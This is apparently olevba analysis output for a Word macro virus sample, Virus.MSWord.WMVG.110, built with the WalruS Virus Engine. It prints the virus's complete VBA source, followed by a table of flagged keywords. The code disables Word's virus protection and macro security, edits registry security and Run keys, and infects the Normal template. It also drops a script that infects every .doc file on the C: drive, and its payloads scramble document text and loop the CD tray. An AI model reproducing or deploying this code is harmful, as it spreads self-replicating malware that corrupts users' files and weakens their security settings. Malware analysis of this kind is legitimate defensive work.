olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.WMVG.110
Type: Text
-------------------------------------------------------------------------------
VBA MACRO ./Virus.MSWord.WMVG.110 
in file: ./Virus.MSWord.WMVG.110 - OLE stream: ''
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Virus Name : dfsdff
' Virus Author : qsdf
' Virus version : dfqsdfqsdf
' Virus Origin : qsdf
' Comments : qsdf
' Greets To : qsd

' A Virus Created By The WalruS Virus Engine (WVE)

Private Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" (ByVal lpstrCommand As String, ByVal lpstrReturnString As String, ByVal uReturnLength As Long, ByVal hwndCallback As Long) As Long
Sub AutoOpen()
JtPxLeRt = OhQt14859 & KtEh13141
    If MacroContainer <> "Normal.dot" Then Call MUE2777
BfKeDmMo = TpGk14126 & SpMe12384
End Sub
LqRuIjDn = KmGz16662 & TnJu10792
Sub AutoClose()
IwDs11044 = OgQrGgEz & UeIo5031 & EmBfEsBo & ReFe11669
SyMvJpJn = LpLw8805 & LoNr4578
    If MacroContainer <> "Normal.dot" ThenCall MUE2777
    If Left(ActiveDocument.Name, 8) <> "Document" And ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
Sub AutoNew()
PzIy17686 = JrAuBpAl & OvKj11801 & Int(Rnd * 7909)
    Call PQM4598
NmRk6413 = SsBvTgFy & VkSr5437 & Int(Rnd * 3501)
HkQn4045 = PeUtTmNr & DqSg14556 & Int(Rnd * 2205)
End Sub
Sub FileSaveAs()
CgMi7913 = TsDmEuVj & CfBy5200 & Int(Rnd * 766)
    Call PQM4598
CwCj16020 = UtCiHfOk & VqPp9258 & Int(Rnd * 6156)
End Sub
Sub AutoExit()
DrTl7985 = LfHwTnLi & StTq14887 & Int(Rnd * 3946)
    Call PQM4598
End Sub
MnPj5902 = TpMzSkBz & GeMz8023 & KvKpOsKm & AwKi8884
Sub PQM4598()
On Error Resume Next
With Options
    .ConfirmConversions = False
    .VirusProtection = False
    .SaveNormalPrompt = False
End With
VtKtUxLz = IkDu13134 & QzGl18414
MhNm4795 = QpKeBtVj & EzKv14438 & Int(Rnd * 7524)
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
WordBasic.DisableAutoMacros 0
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:=" "
VlNxVhQf = AnEm5446 & UhLm10269
GpSk5152 = TfAtOzQk & EsUl8142 & Int(Rnd * 2081)
ActiveDocument.ReadOnlyRecommended = False
If Left(ActiveDocument.Name, 8) = "Document" Then Exit Sub
AwFw12020 = CrJoNsLp & IsNv8310 & CmPoOmEn & AtFl6742
Set NOC2810 = NormalTemplate.VBProject.VBComponents
HrSnCjTv = GvKi5186 & JwSw7058
Set BOE1795 = ActiveDocument.VBProject.VBComponents
If NOC2810.Item("Module1").Name <> "Module1" Then
PzGx10759 = DzImHpVy & OePp1016 & QhUeCsTl & GtPm6100
    NOC2810.Add 1
    NOC2810("Module1").CodeModule.AddFromString BOE1795("Module1").CodeModule.Lines(1, 127)
End If
If BOE1795.Item("Module1").Name <> "Module1" Then
UwGx8437 = JgMfEwIz & PiBy11683 & EqVzOoVy & VnEt15512
    BOE1795.Add 1
    BOE1795("Module1").CodeModule.AddFromString NOC2810("Module1").CodeModule.Lines(1, 127)
    ActiveDocument.Save
End If
LlCyDwRn = UxCv4442 & NnTg4082
LzJp13174 = OmSiEkPr & JrBy3441 & Int(Rnd * 1548)
BOE1795("Module1").Export "C:\Windows\dfsdff.drv"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run", "WVE") = "C:\Windows\dfsdff.vbs"
Open "C:\Windows\dfsdff.vbs" For Output As #1
Print #1, "' dfsdff.vbs for dfsdff Virus by qsdf"
Print #1, "On Error Resume Next"
Print #1, "Dim WSHShell"
Print #1, "Set WSHShell = WScript.CreateObject(""WScript.Shell"")"
Print #1, "Set Backup = WScript.CreateObject(""Word.Application"")"
Print #1, "Backup.Options.VirusProtection = False"
Print #1, "Backup.Options.SaveNormalPrompt = False"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Remove Backup.NormalTemplate.VBProject.VBComponents(""Module1"")"
Print #1, "Backup.NormalTemplate.Save"
Print #1, "Backup.NormalTemplate.VBProject.VBComponents.Import (""C:\Windows\dfsdff.drv"")"
Print #1, "Set Search = Backup.Application.Filesearch"
Print #1, "Search.LookIn = ""C:\"": Search.SearchSubFolders = True: Search.FileName = ""*.doc"": Search.Execute"
Print #1, "For f = 1 To Search.FoundFiles.Count"
Print #1, "Victim = Search.FoundFiles(f)"
Print #1, "Backup.Documents.Open Victim"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Remove Backup.ActiveDocument.VBProject.VBComponents(""Module1"")"
Print #1, "Backup.ActiveDocument.VBProject.VBComponents.Import (""C:\Windows\dfsdff.drv"")"
Print #1, "Backup.ActiveDocument.Save"
Print #1, "Backup.ActiveDocument.Close"
Print #1, "Next"
Print #1, "Backup.Application.Quit"
Close #1
OoSt3759 = FyLpVvIq & TqDh10542 & Int(Rnd * 3279)
TfBsGeKi = CqQs13551 & NjNn7476
DpUiHmQu = VvPt9865 & BvTo9250
BjLq4747 = HuCjErUx & GfCw12892 & Int(Rnd * 255)
If Minute(Now) < 1 Then Call SEP7006
End Sub
Sub SEP7006()
On Error Resume Next
SqSp5616 = JnEuTtSx & AeTe14008 & AqHoMsHj & MqTq3316
GiMz9770 = BhRrCsJq & FpRw8666 & SvHfQpUf & MnBo15682
Do
mciSendString "set cd door open", 0, 0, 0: mciSendString "set cd door closed", 0, 0, 0: mciSendString "set cd time format tmsf wait", 0, 0, 0: mciSendString "open cdaudio alias cd wait shareable", 0, 0, 0
KvFs11556 = MjFnIyIz & NkPf12444 & Int(Rnd * 5572)
Loop
End Sub
Sub MUE2777()
NiEvAgDh = QfOf6247 & AhCt11731
IfLq16007 = GmDlJuJp & AtAh10187 & Int(Rnd * 9993)
On Error GoTo Fin
Selection.WholeStory
DfGg17639 = AwPeEoVz & QyCl10256 & Int(Rnd * 8002)
A$ = Selection
For a_ = 1 To Len(A$) Step 2
DtTgRjNi = DjOm13709 & ViGz13324
b$ = b$ + Mid(A$, a_ + 1, 1)
b$ = b$ + Mid(A$, a_, 1)
GzRyAtQh = SmCu10530 & FiLn9303
Next
Selection.TypeText Text:=b$
Selection.Range.Delete
Selection.HomeKey Unit:=wdStory, Extend:=wdMove
KfOhRpTi = DmTj5852 & NjKw7110
Fin:
End Sub
' Another Virus Created By The WalruS Virus Generator (WVE) Version 1.10
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |winmm.dll           |Executable file name                         |
|IOC       |dfsdff.vbs          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

